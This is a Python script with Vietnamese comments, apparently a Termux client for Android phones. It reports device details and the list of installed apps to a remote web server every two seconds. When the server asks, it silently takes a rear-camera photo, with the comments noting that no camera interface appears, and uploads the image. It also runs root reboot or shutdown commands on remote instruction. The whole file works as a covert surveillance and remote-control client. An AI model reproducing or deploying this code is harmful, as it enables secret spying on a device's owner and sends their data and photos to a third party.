import time
import platform
import os
import requests
import subprocess
import json

def get_cmd_output(cmd):
    """Hàm bổ trợ chạy lệnh hệ thống Android an toàn"""
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode('utf-8', errors='ignore').strip()
    except Exception:
        return ""

def get_android_ips():
    """Lấy IP thật mạng Wi-Fi/4G đang kết nối"""
    ips = []
    # Thử lấy IP qua lệnh nội bộ của Termux
    ifconfig = get_cmd_output("ifconfig")
    for line in ifconfig.split('\n'):
        if "inet " in line and "127.0.0.1" not in line:
            parts = line.strip().split()
            if len(parts) >= 2:
                ips.append(f"Mạng: {parts[1]}")
    return ips if ips else ["Chưa kết nối mạng"]

def get_android_memory():
    """Đọc dung lượng RAM thật"""
    try:
        with open('/proc/meminfo', 'r') as f:
            lines = f.readlines()
        total, free = 0, 0
        for line in lines:
            if "MemTotal" in line: total = int(line.split()[1])
            elif "MemFree" in line: free = int(line.split()[1])
        used = total - free
        return {
            "percentage": f"{round((used / total) * 100, 1)}%",
            "used": f"{round(used / (1024**2), 2)} GB",
            "total": f"{round(total / (1024**2), 2)} GB"
        }
    except Exception:
        return {"percentage": "0%", "used": "0 GB", "total": "0 GB"}

def get_android_storage():
    """Đọc dung lượng bộ nhớ trong thật (Ổ đĩa)"""
    try:
        df_out = get_cmd_output("df -h /storage/emulated/0")
        lines = df_out.split('\n')
        if len(lines) >= 2:
            parts = lines[1].split()
            # Thường cấu trúc: Filesystem Size Used Avail Use% Mounted_on
            if len(parts) >= 5:
                return [{"device": "Bộ nhớ trong", "percentage": parts[4], "free": parts[3]}]
    except Exception: pass
    return [{"device": "Bộ nhớ trong", "percentage": "N/A", "free": "N/A"}]

def get_installed_packages():
    """Quét danh sách các ứng dụng (.apk) đã cài trên máy"""
    try:
        # Lấy danh sách package của ứng dụng bên thứ 3
        pm_out = get_cmd_output("pm list packages -3")
        apps = [line.replace("package:", "") for line in pm_out.split('\n') if line.strip()]
        return sorted(apps)[:40] # Giới hạn 40 app đầu tiên để tránh quá tải dung lượng gửi
    except Exception:
        return ["Không đọc được danh sách App"]

def take_android_camera_shot():
    """Chụp ảnh từ CAMERA THẬT bằng lệnh Termux-API từ xa"""
    try:
        photo_path = "cam_shot.jpg"
        # Tự động chụp bằng camera sau (id 0), không hiện giao diện app chụp ảnh
        get_cmd_output(f"termux-camera-photo -c 0 {photo_path}")
        
        if os.path.exists(photo_path) and os.path.getsize(photo_path) > 0:
            with open(photo_path, "rb") as image_file:
                encoded_string = base64.b64encode(image_file.read()).decode('utf-8')
            os.remove(photo_path) # Xóa file tạm sau khi mã hóa
            return "data:image/jpeg;base64," + encoded_string
    except Exception: pass
    return "ERROR: Không thể chụp ảnh Camera (Hãy chắc chắn đã cấp quyền cho Termux)"

def get_complete_android_info():
    device_model = get_cmd_output("getprop ro.product.model") or "Android_Device"
    device_brand = get_cmd_output("getprop ro.product.brand") or ""
    android_ver = get_cmd_output("getprop ro.build.version.release") or "Unknown"
    
    # Định danh ID máy dựa trên tên thương hiệu + model
    unique_name = f"{device_brand}_{device_model}".replace(" ", "_").strip()

    # Lấy uptime
    uptime_str = "N/A"
    try:
        with open('/proc/uptime', 'r') as f:
            uptime_seconds = float(f.readline().split()[0])
        uptime_str = f"{int(uptime_seconds // 3600)} giờ, {int((uptime_seconds % 3600) // 60)} phút"
    except Exception: pass

    return {
        "computer_name": unique_name,
        "os": f"Android {android_ver}",
        "architecture": platform.machine(),
        "boot_time": "N/A",
        "uptime": uptime_str,
        "mac_address": "Android_MAC_Protected",
        "all_ips": get_android_ips(),
        "cpu": {"current_usage": "Đang chạy ngầm"},
        "ram": get_android_memory(),
        "gpus": [{"name": "Mali / Adreno Mobile", "load": "Tự động", "memory_total": "Dynamic RAM"}],
        "disks": get_android_storage(),
        "total_tasks": len(os.listdir('/proc')) if os.path.exists('/proc') else 0,
        "top_cpu_names": ["Hệ thống Termux", "Tiến trình ngầm"],
        "top_ram_names": ["Android OS Core"],
        "installed_apps_list": get_installed_packages(),
        "cameras": [{"index": 0, "name": "Camera Sau (Chính)"}, {"index": 1, "name": "Camera Trước"}],
        "microphones": [{"index": 0, "name": "Microphone Hệ Thống"}]
    }

def send_data_to_cloud():
    URL = "http://devtung.pythonanywhere.com/update-status"
    print("🚀 Android Advanced Client đang kết nối tới Server...")
    
    cam_data = None

    while True:
        try:
            payload = get_complete_android_info()
            
            # Nếu có lệnh yêu cầu chụp ảnh từ Web gửi về ở vòng lặp trước
            if cam_data:
                payload["cam_result"] = cam_data
                cam_data = None
                
            response = requests.post(URL, json=payload, timeout=8)
            if response.status_code == 200:
                res_json = response.json()
                
                # Bắt lệnh chụp ảnh CAMERA từ giao diện Web
                if res_json.get("trigger_cam_index") is not None:
                    print("📸 Nhận lệnh chụp ảnh từ Server...")
                    cam_data = take_android_camera_shot()
                    
                # Bắt lệnh tắt máy / khởi động lại (Chỉ hoạt động nếu Android TV/Điện thoại đã ROOT)
                trigger_power = res_json.get("trigger_power_command")
                if trigger_power:
                    if trigger_power == "shutdown": os.system("su -c reboot -p")
                    elif trigger_power == "restart": os.system("su -c reboot")

        except Exception as e:
            print(f"Lỗi đồng bộ: {e}")
        time.sleep(2.0)

if __name__ == "__main__":
    import base64
    send_data_to_cloud()
